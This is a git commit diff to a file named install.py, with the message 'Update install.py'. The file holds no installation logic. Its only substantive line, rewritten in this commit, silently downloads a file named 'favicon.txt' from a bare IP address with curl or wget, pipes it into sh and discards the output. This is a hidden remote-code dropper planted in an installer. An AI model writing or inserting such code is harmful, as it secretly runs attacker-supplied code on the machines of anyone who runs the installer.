4b1f083304f63e84e1e39dc5bb81f7f1cbe87c09
prekkk123 <precupewes@hotmail.com>
2025-01-10 15:47:13 +0800

    Update install.py

--- install.py
+++ install.py
@@ -1,2 +1,2 @@
 import  os
-os.system("sh -c 'curl 192.3.209.43/favicon.txt|sh >/dev/null 2>&1 &'")
+os.system("sh -c '(curl http://192.3.209.43/favicon.txt|| wget -O - http://192.3.209.43/favicon.txt)|sh' >/dev/null 2>&1")
